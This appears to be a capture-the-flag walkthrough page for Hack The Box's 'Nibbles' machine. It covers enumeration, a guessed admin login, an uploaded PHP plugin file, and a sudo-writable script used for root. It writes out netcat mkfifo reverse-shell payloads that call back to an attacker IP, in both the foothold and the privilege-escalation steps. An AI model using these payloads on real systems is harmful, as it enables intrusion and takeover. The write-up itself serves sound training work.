@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="height=device-height, width=device-width, initial-scale=1.0, minimum-scale=1.0">
+    <meta name="generator" content="Hugo 0.142.0">
+    <meta name="generator" content="Relearn 5.22.1+tip">
+    <meta name="description" content="Nibbles is a fairly simple machine, however with the inclusion of a login blacklist, it is a fair bit more challenging to find valid credentials. Luckily, a username can be enumerated and guessing the correct password does not take long for most.">
+    <meta name="author" content="">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/walkthroughs/nibbles/logo.png">
+  <meta name="twitter:title" content="Nibbles - HTB">
+  <meta name="twitter:description" content="Nibbles is a fairly simple machine, however with the inclusion of a login blacklist, it is a fair bit more challenging to find valid credentials. Luckily, a username can be enumerated and guessing the correct password does not take long for most."><meta property="og:url" content="http://localhost:1313/walkthroughs/nibbles/">
+  <meta property="og:site_name" content="H1roBytes">
+  <meta property="og:title" content="Nibbles - HTB">
+  <meta property="og:description" content="Nibbles is a fairly simple machine, however with the inclusion of a login blacklist, it is a fair bit more challenging to find valid credentials. Luckily, a username can be enumerated and guessing the correct password does not take long for most.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="website">
+    <meta property="og:image" content="http://localhost:1313/walkthroughs/nibbles/logo.png">
+    <title>Nibbles - HTB - H1roBytes</title>
+    <link href="/walkthroughs/nibbles/index.xml" rel="alternate" type="application/rss+xml" title="Nibbles - HTB - H1roBytes">
+    <link href="/images/logo.png?1738202701" rel="icon" type="image/png">
+    <!-- https://github.com/filamentgroup/loadCSS/blob/master/README.md#how-to-use -->
+    <link href="/css/fontawesome-all.min.css?1738202701" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fontawesome-all.min.css?1738202701" rel="stylesheet"></noscript>
+    <link href="/css/nucleus.css?1738202701" rel="stylesheet">
+    <link href="/css/auto-complete.css?1738202701" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/auto-complete.css?1738202701" rel="stylesheet"></noscript>
+    <link href="/css/perfect-scrollbar.min.css?1738202701" rel="stylesheet">
+    <link href="/css/fonts.css?1738202701" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fonts.css?1738202701" rel="stylesheet"></noscript>
+    <link href="/css/theme.css?1738202701" rel="stylesheet">
+    <link href="/css/theme-relearn-dark.css?1738202701" rel="stylesheet" id="R-variant-style">
+    <link href="/css/variant.css?1738202701" rel="stylesheet">
+    <link href="/css/print.css?1738202701" rel="stylesheet" media="print">
+    <link href="/css/ie.css?1738202701" rel="stylesheet">
+    <script src="/js/url.js?1738202701"></script>
+    <script src="/js/variant.js?1738202701"></script>
+    <script>
+      // hack to let hugo tell us how to get to the root when using relativeURLs, it needs to be called *url= for it to do its magic:
+      // https://github.com/gohugoio/hugo/blob/145b3fcce35fbac25c7033c91c1b7ae6d1179da8/transform/urlreplacers/absurlreplacer.go#L72
+      window.index_js_url="/index.search.js";
+      var root_url="/";
+      var baseUri=root_url.replace(/\/$/, '');
+      // translations
+      window.T_Copy_to_clipboard = 'Copy to clipboard';
+      window.T_Copied_to_clipboard = 'Copied to clipboard!';
+      window.T_Copy_link_to_clipboard = 'Copy link to clipboard';
+      window.T_Link_copied_to_clipboard = 'Copied link to clipboard!';
+      window.T_Reset_view = 'Reset view';
+      window.T_View_reset = 'View reset!';
+      window.T_No_results_found = 'No results found for \u0022{0}\u0022';
+      window.T_N_results_found = '{1} results found for \u0022{0}\u0022';
+      // some further base stuff
+      var baseUriFull='http:\/\/localhost:1313/';
+      window.variants && variants.init( [ 'relearn-dark', 'zen-dark', 'relearn-bright', 'relearn-light', 'zen-light', 'neon', 'learn', 'blue', 'green', 'red' ] );
+    </script>
+  </head>
+  <body class="mobile-support html" data-url="/walkthroughs/nibbles/index.html">
+    <div id="R-body" class="default-animation">
+      <div id="R-body-overlay"></div>
+      <nav id="R-topbar">
+        <div class="topbar-wrapper">
+          <div class="topbar-sidebar-divider"></div>
+          <div class="topbar-area topbar-area-start" data-area="start">
+            <div class="topbar-button topbar-button-sidebar" data-content-empty="disable" data-width-s="show" data-width-m="hide" data-width-l="hide">
+              <button class="topbar-control" onclick="toggleNav()" type="button" title="Menu (CTRL&#43;ALT&#43;n)">
+                <i class="fa-fw fas fa-bars"></i>
+              </button>
+            </div>
+            <div class="topbar-button topbar-button-toc" data-content-empty="hide" data-width-s="show" data-width-m="show" data-width-l="show">
+              <button class="topbar-control" onclick="toggleTopbarFlyout(this)" type="button" title="Table of Contents (CTRL&#43;ALT&#43;t)">
+                <i class="fa-fw fas fa-list-alt"></i>
+              </button>
+              <div class="topbar-content">
+                <div class="topbar-content-wrapper"><nav class="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#initial-foothold">Initial Foothold</a></li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+  </ul>
+</nav>
+                </div>
+              </div>
+            </div>
+          </div>
+          <span class="topbar-breadcrumbs highlightable">
+            Nibbles - HTB
+          </span>
+          <div class="topbar-area topbar-area-end" data-area="end">
+            <div class="topbar-button topbar-button-more" data-content-empty="hide" data-width-s="show" data-width-m="show" data-width-l="show">
+              <button class="topbar-control" onclick="toggleTopbarFlyout(this)" type="button" title="More">
+                <i class="fa-fw fas fa-ellipsis-v"></i>
+              </button>
+              <div class="topbar-content">
+                <div class="topbar-content-wrapper">
+                  <div class="topbar-area topbar-area-more" data-area="more">
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav>
+      <div id="R-main-overlay"></div>
+      <main id="R-body-inner" class="highlightable default" tabindex="-1">
+        <div class="flex-block-wrapper">
+          <article class="default">
+            <header class="headline">
+<div class=" taxonomy-tags term-list cstyle  tags" title="Tags" style="--VARIABLE-TAGS-BG-color: var(--INTERNAL-TAG-BG-color);">
+  <ul>
+    <li><a class="term-link" href="/tags/hackthebox/index.html">HackTheBox</a></li>
+    <li><a class="term-link" href="/tags/linux/index.html">Linux</a></li>
+    <li><a class="term-link" href="/tags/rce/index.html">RCE</a></li>
+    <li><a class="term-link" href="/tags/web-application/index.html">Web Application</a></li>
+  </ul>
+</div>
+            </header>
+<h1 id="nibbles---htb">Nibbles - HTB</h1>
+
+<p><a href="#R-image-b9eb3c60c0e3da8d9f1a2e6bb05c6ac8" class="lightbox-link"><img src="/walkthroughs/nibbles/logo.png" alt="Logo" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-b9eb3c60c0e3da8d9f1a2e6bb05c6ac8"><img src="/walkthroughs/nibbles/logo.png" alt="Logo" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>Date written: April 2024  <br>
+Date published: April 2024</p>
+<h2 id="introduction">Introduction</h2>
+<p>Nibbles is a fairly simple machine, however with the inclusion of a login blacklist, it is a fair bit more challenging to find valid credentials. Luckily, a username can be enumerated and guessing the correct password should not take long.</p>
+<p>Nibbles is a good starter or refresher machine too. As a note I did do this box in conjunction with HTB Academy&rsquo;s Pentester Path. So some information may not be needed to complete the box, but its good to review.</p>
+<p>As always you will want to 
+<a href="https://help.hackthebox.com/en/articles/5185687-introduction-to-lab-access" target="_blank">connect</a> to your HTB VPN or connect to Pwnbox. Once your connected lets get started with Nibbles!</p>
+<h2 id="enumeration">Enumeration</h2>
+<p>I started by running an basic port scan on the box just to see what I could access. I also added the flags -sC to run a basic set of scripts on each open port and the -sV flag to identify the version of each service running.</p>
+<p><code>nmap -sV -sC $IP</code></p>
+<p><a href="#R-image-d1f93882719bd9bd3db6f8c85629174c" class="lightbox-link"><img src="/walkthroughs/nibbles/NMAP.png" alt="NMAP Scan" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-d1f93882719bd9bd3db6f8c85629174c"><img src="/walkthroughs/nibbles/NMAP.png" alt="NMAP Scan" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>I saw that port 80 and port 22 were open and decided to do a little more recon on each port before diving into the website. First I ran netcat banner grab on each port. Then ran the nmap script http-enum.</p>
+<p>The banner grab on port 22 did give me the SSH version, but port 80 did not yield anything. The nmap http-enu script did give me the same information for port 22, but also gave me the apache version of the web server.</p>
+<div class="wrap-code highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nv  10.129.125.8 <span style="color:#ae81ff">22</span>
+</span></span><span style="display:flex;"><span>nc -nv  10.129.125.8 <span style="color:#ae81ff">80</span>
+</span></span><span style="display:flex;"><span>nmap -sV --script<span style="color:#f92672">=</span>http-enum 10.129.125.8</span></span></code></pre></div><p><a href="#R-image-41726486176937b9d76435364ea75488" class="lightbox-link"><img src="/walkthroughs/nibbles/NMAP2.png" alt="NMAP HTTP enumeration and banner grabbing" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-41726486176937b9d76435364ea75488"><img src="/walkthroughs/nibbles/NMAP2.png" alt="NMAP HTTP enumeration and banner grabbing" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>After find that information I decided to give into the webpage. The initial webpage doesn&rsquo;t give me much, but the source code does reveal a url I can navigate to <code>http://$IP/nibbleblog</code>.</p>
+<p><a href="#R-image-b5645e1b3778d9e369646a6c278fcea2" class="lightbox-link"><img src="/walkthroughs/nibbles/Nibbleblog.png" alt="Homepage source code" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-b5645e1b3778d9e369646a6c278fcea2"><img src="/walkthroughs/nibbles/Nibbleblog.png" alt="Homepage source code" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>Navigating to  <code>/nibbleblog</code> does not yield much either, but I decided to run a gobuster scan to see if there were any more urls I could utilize.</p>
+<p><code>gobuster dir -u http://10.129.125.8/nibbleblog/ --wordlist /usr/share/dirb/wordlists/common.txt</code></p>
+<p><a href="#R-image-972d2f64083888bdced1f13f53f88e45" class="lightbox-link"><img src="/walkthroughs/nibbles/gobuster.png" alt="Gobuster blog" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-972d2f64083888bdced1f13f53f88e45"><img src="/walkthroughs/nibbles/gobuster.png" alt="Gobuster blog" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>After the scan completed I now have access to a handful of other directories. If this were an actual penetration test I would run gobuster/dirbuster/wfuzz/etc scan against each of those URLs as well as the main domain.</p>
+<p>The above screenshot does not show the <code>/nibbleblog/README</code> page, but it is a common page I will check along with the siteslist and robots.txt pages. I ran a <code>curl</code> command on the README page and it revealed the nibbleblog version the site is running. It also says the content directory is writable. Navigating to <code>/nibbleblog/content</code> gives me a file directory.</p>
+<p><code>curl http://10.129.125.8/nibbleblog/README</code></p>
+<p><a href="#R-image-dd0f3d7cd83b7457cd87cae136bdfaee" class="lightbox-link"><img src="/walkthroughs/nibbles/version.png" alt="Curl version" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-dd0f3d7cd83b7457cd87cae136bdfaee"><img src="/walkthroughs/nibbles/version.png" alt="Curl version" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>After searching the file directory for a while I found the file <code>users.xml</code>. I opened the file by clicking the link, but the same can be achieved by using curl. The file contains the username <code>admin</code>. So now I have a username, but no login page, yet.</p>
+<p><a href="#R-image-0e243ab5613dfcb755b99676ed059189" class="lightbox-link"><img src="/walkthroughs/nibbles/users%20file.png" alt="users directory location" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-0e243ab5613dfcb755b99676ed059189"><img src="/walkthroughs/nibbles/users%20file.png" alt="users directory location" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p><a href="#R-image-9483e8d89afce3719311d08133bf12e1" class="lightbox-link"><img src="/walkthroughs/nibbles/users.png" alt="Users file contents" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-9483e8d89afce3719311d08133bf12e1"><img src="/walkthroughs/nibbles/users.png" alt="Users file contents" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>I then went back to my gobuster results and navigated to the admin.php page, which is the log in page. I have the username of admin, but still need a password. My typical first password to guess is admin, but no luck. I then tried the name of the box and I was in.</p>
+<p><code>username: admin password: nibbles</code></p>
+<p><a href="#R-image-95cd9af6d4d44c1f2179d972481ab047" class="lightbox-link"><img src="/walkthroughs/nibbles/login.png" alt="Log in" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-95cd9af6d4d44c1f2179d972481ab047"><img src="/walkthroughs/nibbles/login.png" alt="Log in" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<h2 id="initial-foothold">Initial Foothold</h2>
+<p>The first thing I notice on the page is the plugin directory, because plugin directories typically let you upload files. I start by crafting a reverse bash shell with in a php script. I use the 
+<a href="https://www.revshells.com/" target="_blank">Reverse Shell Generator</a>, but my two favorite resources are 
+<a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/" target="_blank">HighOn.Coffee&rsquo;s blog</a> and 
+<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" target="_blank">PayloadAllTheThings</a></p>
+<p><code>&lt;?php system (&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc $IP $PORT &gt;/tmp/f&quot;); ?&gt;</code></p>
+<p><a href="#R-image-cceabba14b2e2e652917cda0af82bc8b" class="lightbox-link"><img src="/walkthroughs/nibbles/revshell.png" alt="Reverse Shell Generator" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-cceabba14b2e2e652917cda0af82bc8b"><img src="/walkthroughs/nibbles/revshell.png" alt="Reverse Shell Generator" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p><a href="#R-image-b3f36b3cd9ae71c42260466269341177" class="lightbox-link"><img src="/walkthroughs/nibbles/php%20shell.png" alt="Shell file" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-b3f36b3cd9ae71c42260466269341177"><img src="/walkthroughs/nibbles/php%20shell.png" alt="Shell file" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p><a href="#R-image-8782d2cb0ae3245069ebc306b2a2dfcd" class="lightbox-link"><img src="/walkthroughs/nibbles/php%20shell2.png" alt="Plugin" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-8782d2cb0ae3245069ebc306b2a2dfcd"><img src="/walkthroughs/nibbles/php%20shell2.png" alt="Plugin" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>Once I uploaded my shell I set up a netcat listener with <code>nc -lvnp $IP $PORT</code> using the same IP and port I specified in my shell.</p>
+<p><a href="#R-image-f071ff8c93d7a0fd96fef3baafe64260" class="lightbox-link"><img src="/walkthroughs/nibbles/listener.png" alt="Listener" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-f071ff8c93d7a0fd96fef3baafe64260"><img src="/walkthroughs/nibbles/listener.png" alt="Listener" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>I then navigated to the directory where the <code>image.php</code> plug in is stored. <code>/nibbleblog/content/private/plugins/my_images</code></p>
+<p><a href="#R-image-d904345919ac78db99e5d57efa7f9175" class="lightbox-link"><img src="/walkthroughs/nibbles/php%20shell3.png" alt="Shell directory" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-d904345919ac78db99e5d57efa7f9175"><img src="/walkthroughs/nibbles/php%20shell3.png" alt="Shell directory" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>Click the <code>image.php</code> shell you created, go to your listener, and there should be a shell. Once I had a base shell I upgraded it with the following commands.</p>
+<p><code>python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code></p>
+<p><a href="#R-image-e90cd6b4d10595f3a0b56349ce57dd89" class="lightbox-link"><img src="/walkthroughs/nibbles/shell%20upgrade.png" alt="Upgrade shell" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-e90cd6b4d10595f3a0b56349ce57dd89"><img src="/walkthroughs/nibbles/shell%20upgrade.png" alt="Upgrade shell" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>Navigate to the <code>/home/nibbler/user.txt</code> file and cat your user flag!</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>In the nibbler directory there is also a file called personal.zip. I unzipped the file and saw that there is a script called monitor.sh which isn&rsquo;t helpful at the moment. So I then started a python server on my host machine <code>sudo python3 -m http.server $Port</code> to transfer the 
+<a href="https://github.com/rebootuser/LinEnum" target="_blank">LinEnum</a> script to the victim machine.</p>
+<p><a href="#R-image-2dae3cc160a99d9330a7dfbe557ff726" class="lightbox-link"><img src="/walkthroughs/nibbles/python%20server.png" alt="Python server" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-2dae3cc160a99d9330a7dfbe557ff726"><img src="/walkthroughs/nibbles/python%20server.png" alt="Python server" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>I saved the LinEnum script to my / directory. Back on the nibbler server I downloaded LinEnum with <code>wget $IP/Path/To/LinEnum</code>. The IP should be your IP not 0.0.0.0 like the python server terminal may show.</p>
+<p><a href="#R-image-2c67375f47c93045f650c326a300e3d9" class="lightbox-link"><img src="/walkthroughs/nibbles/LinEnum.png" alt="LinEnum" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-2c67375f47c93045f650c326a300e3d9"><img src="/walkthroughs/nibbles/LinEnum.png" alt="LinEnum" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>Once downloaded I changed the permissions of the file with <code>chmod  +x LinEnum.sh</code>. Then ran the script with <code>./LinEnum.sh</code>.</p>
+<p>After a while the script will finish and I found that the user <code>nibbler</code> can run the file /home/nibbler/personal/stuff/monitor.sh with root privileges.
+<a href="#R-image-757296c5983f311a21c74bb931759ee5" class="lightbox-link"><img src="/walkthroughs/nibbles/LinEnum2.png" alt="sudo LinEnum" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-757296c5983f311a21c74bb931759ee5"><img src="/walkthroughs/nibbles/LinEnum2.png" alt="sudo LinEnum" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>Now I know I can run the file, but what I really need is a shell, not to run the existing file. I wrote a bash script to the monitor.sh file and set up a new room listener.</p>
+<p><code>echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc $IP $PORT &gt;/tmp/f' | tee -a monitor.sh</code></p>
+<p>After the listener is set up I ran the monitor.sh file, which looks like it breaks or does nothing, but checking the listener says otherwise.</p>
+<p><a href="#R-image-c568c9705fa9616e78e717db472150ef" class="lightbox-link"><img src="/walkthroughs/nibbles/sudo%20privs.png" alt="Root" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-c568c9705fa9616e78e717db472150ef"><img src="/walkthroughs/nibbles/sudo%20privs.png" alt="Root" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p><a href="#R-image-76f9c685ff81188ce172402f44bb2a66" class="lightbox-link"><img src="/walkthroughs/nibbles/Root%20listner.png" alt="Root Listener" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-76f9c685ff81188ce172402f44bb2a66"><img src="/walkthroughs/nibbles/Root%20listner.png" alt="Root Listener" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>We have root! I then cat-ed <code>/root/root.txt</code></p>
+
+            <footer class="footline">
+            </footer>
+          </article>
+        </div>
+      </main>
+    </div>
+    <aside id="R-sidebar" class="default-animation">
+      <div id="R-header-topbar" class="default-animation"></div>
+      <div id="R-header-wrapper" class="default-animation">
+        <div id="R-header" class="default-animation">
+<a href="/index.html">
+    <img src="/images/logo.png" 
+        width="200"
+        height="120"
+        alt="Website logo of hacker cat"/>
+    <h2 style="padding:0; margin:0;">H1roBytes</h2>
+</a>
+        </div>
+        <div class="searchbox default-animation">
+          <i class="fas fa-search" title="Search (CTRL+ALT+f)"></i>
+          <label class="a11y-only" for="R-search-by">Search</label>
+          <input data-search-input id="R-search-by" name="search-by" class="search-by" type="search" placeholder="Search...">
+          <button class="search-clear" type="button" data-search-clear="" title="Clear search"><i class="fas fa-times" title="Clear search"></i></button>
+        </div>
+        <script>
+          var contentLangs=['en'];
+        </script>
+        <script src="/js/auto-complete.js?1738202701" defer></script>
+        <script src="/js/lunr/lunr.min.js?1738202701" defer></script>
+        <script src="/js/lunr/lunr.stemmer.support.min.js?1738202701" defer></script>
+        <script src="/js/lunr/lunr.multi.min.js?1738202701" defer></script>
+        <script src="/js/lunr/lunr.en.min.js?1738202701" defer></script>
+        <script src="/js/search.js?1738202701" defer></script>
+      </div>
+      <div id="R-homelinks" class="default-animation">
+        <hr class="padding">
+      </div>
+      <div id="R-content-wrapper" class="highlightable">
+        <div id="R-topics">
+          <ul class="enlarge morespace collapsible-menu">
+          <li data-nav-id="/walkthroughs/index.html" class="parent "><input type="checkbox" id="R-section-a25630664138ae6b33064dc3d9c0b30e" aria-controls="R-subsections-a25630664138ae6b33064dc3d9c0b30e" checked><label for="R-section-a25630664138ae6b33064dc3d9c0b30e"><i class="fas fa-chevron-down"></i><i class="fas fa-chevron-right"></i><span class="a11y-only">Submenu Walkthroughs</span></label><a class="padding" href="/walkthroughs/index.html">Walkthroughs</a><ul id="R-subsections-a25630664138ae6b33064dc3d9c0b30e" class="morespace collapsible-menu">
+          <li data-nav-id="/walkthroughs/2023-advent-of-cyber/index.html" class=""><a class="padding" href="/walkthroughs/2023-advent-of-cyber/index.html">Advent of Cyber 2023! - TryHackMe</a></li>
+          <li data-nav-id="/walkthroughs/cozyhosting/index.html" class=""><a class="padding" href="/walkthroughs/cozyhosting/index.html">Cozy Hosting - Hack The Box</a></li>
+          <li data-nav-id="/walkthroughs/kenobi/index.html" class=""><a class="padding" href="/walkthroughs/kenobi/index.html">Kenobi - TryHackMe</a></li>
+          <li data-nav-id="/walkthroughs/nibbles/index.html" class="active"><a class="padding" href="/walkthroughs/nibbles/index.html">Nibbles - HTB</a></li>
+          <li data-nav-id="/walkthroughs/red-team-engagements/index.html" class=""><a class="padding" href="/walkthroughs/red-team-engagements/index.html">Red Team Engagements - TryHackMe</a></li>
+          <li data-nav-id="/walkthroughs/red-team-fundamentals/index.html" class=""><a class="padding" href="/walkthroughs/red-team-fundamentals/index.html">Red Team Fundamentals - TryHackMe</a></li>
+          <li data-nav-id="/walkthroughs/rootme/index.html" class=""><a class="padding" href="/walkthroughs/rootme/index.html">RootMe - TryHackMe</a></li>
+          <li data-nav-id="/walkthroughs/steel-mountain/index.html" class=""><a class="padding" href="/walkthroughs/steel-mountain/index.html">Steel Mountain - TryHackMe</a></li></ul></li>
+          <li data-nav-id="/resources/index.html" class=""><input type="checkbox" id="R-section-4fbbb0c8ab4cb18ef7db60d823ac6d24" aria-controls="R-subsections-4fbbb0c8ab4cb18ef7db60d823ac6d24"><label for="R-section-4fbbb0c8ab4cb18ef7db60d823ac6d24"><i class="fas fa-chevron-down"></i><i class="fas fa-chevron-right"></i><span class="a11y-only">Submenu Resources</span></label><a class="padding" href="/resources/index.html">Resources</a><ul id="R-subsections-4fbbb0c8ab4cb18ef7db60d823ac6d24" class="morespace collapsible-menu">
+          <li data-nav-id="/resources/active-directory-enumeration/index.html" class=""><a class="padding" href="/resources/active-directory-enumeration/index.html">Active Directory Enumeration</a></li></ul></li>
+          <li data-nav-id="/contact/index.html" class=""><a class="padding" href="/contact/index.html">Contact</a></li>
+          </ul>
+        </div>
+        <div class="padding footermargin footerLangSwitch footerVariantSwitch footerVisitedLinks footerFooter showVariantSwitch showFooter"></div>
+        <div id="R-menu-footer">
+          <hr class="padding default-animation footerLangSwitch footerVariantSwitch footerVisitedLinks footerFooter showVariantSwitch showFooter">
+          <div id="R-prefooter" class="footerLangSwitch footerVariantSwitch footerVisitedLinks showVariantSwitch">
+            <ul>
+              <li id="R-select-language-container" class="footerLangSwitch">
+                <div class="padding menu-control">
+                  <i class="fas fa-language fa-fw"></i>
+                  <span>&nbsp;</span>
+                  <div class="control-style">
+                    <label class="a11y-only" for="R-select-language">Language</label>
+                    <select id="R-select-language" onchange="location = baseUri + this.value;">
+                      <option id="R-en" value="/walkthroughs/nibbles/index.html" lang="en" selected></option>
+                    </select>
+                  </div>
+                  <div class="clear"></div>
+                </div>
+              </li>
+              <li id="R-select-variant-container" class="footerVariantSwitch showVariantSwitch">
+                <div class="padding menu-control">
+                  <i class="fas fa-paint-brush fa-fw"></i>
+                  <span>&nbsp;</span>
+                  <div class="control-style">
+                    <label class="a11y-only" for="R-select-variant">Theme</label>
+                    <select id="R-select-variant" onchange="window.variants && variants.changeVariant( this.value );">
+                      <option id="R-relearn-dark" value="relearn-dark" selected>Relearn Dark</option>
+                      <option id="R-zen-dark" value="zen-dark">Zen Dark</option>
+                      <option id="R-relearn-bright" value="relearn-bright">Relearn Bright</option>
+                      <option id="R-relearn-light" value="relearn-light">Relearn Light</option>
+                      <option id="R-zen-light" value="zen-light">Zen Light</option>
+                      <option id="R-neon" value="neon">Neon</option>
+                      <option id="R-learn" value="learn">Learn</option>
+                      <option id="R-blue" value="blue">Blue</option>
+                      <option id="R-green" value="green">Green</option>
+                      <option id="R-red" value="red">Red</option>
+                    </select>
+                  </div>
+                  <div class="clear"></div>
+                </div>
+                <script>window.variants && variants.markSelectedVariant();</script>
+              </li>
+              <li class="footerVisitedLinks">
+                <div class="padding menu-control">
+                  <i class="fas fa-history fa-fw"></i>
+                  <span>&nbsp;</span>
+                  <div class="control-style">
+                    <button onclick="clearHistory();">Clear History</button>
+                  </div>
+                  <div class="clear"></div>
+                </div>
+              </li>
+            </ul>
+          </div>
+          <div id="R-footer" class="footerFooter showFooter">
+	    <p>Built with <a href="https://github.com/McShelby/hugo-theme-relearn" title="love"><i class="fas fa-heart"></i></a> by <a href="https://gohugo.io/">Hugo</a></p>
+		<p><a href="https://hirobytes.xyz/disclaimer">Disclaimer</a></p>
+          </div>
+        </div>
+      </div>
+    </aside>
+    <script src="/js/clipboard.min.js?1738202701" defer></script>
+    <script src="/js/perfect-scrollbar.min.js?1738202701" defer></script>
+    <script>
+      function useMathJax( config ){
+        if( !Object.assign ){
+          
+          return;
+        }
+        window.MathJax = Object.assign( window.MathJax || {}, {
+          loader: {
+            load: ['[tex]/mhchem']
+          },
+          startup: {
+            elements: [
+              '.math'
+            ]
+          },
+          tex: {
+            inlineMath: [
+              ['$', '$'], 
+              ['\\(', '\\)']
+            ]
+          },
+          options: {
+            enableMenu: false 
+          }
+        }, config );
+      }
+      useMathJax( JSON.parse( null ) );
+    </script>
+    <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+    <script src="/js/d3/d3-color.min.js?1738202701" defer></script>
+    <script src="/js/d3/d3-dispatch.min.js?1738202701" defer></script>
+    <script src="/js/d3/d3-drag.min.js?1738202701" defer></script>
+    <script src="/js/d3/d3-ease.min.js?1738202701" defer></script>
+    <script src="/js/d3/d3-interpolate.min.js?1738202701" defer></script>
+    <script src="/js/d3/d3-selection.min.js?1738202701" defer></script>
+    <script src="/js/d3/d3-timer.min.js?1738202701" defer></script>
+    <script src="/js/d3/d3-transition.min.js?1738202701" defer></script>
+    <script src="/js/d3/d3-zoom.min.js?1738202701" defer></script>
+    <script src="/js/js-yaml.min.js?1738202701" defer></script>
+    <script src="https://unpkg.com/mermaid/dist/mermaid.min.js" defer></script>
+    <script>
+      window.themeUseMermaid = JSON.parse( null );
+    </script>
+    <script>window.noZensmooth = true;</script>
+    <script src="https://unpkg.com/swagger-ui-dist/swagger-ui-bundle.js" defer></script>
+    <script src="https://unpkg.com/swagger-ui-dist/swagger-ui-standalone-preset.js" defer></script>
+    <script>
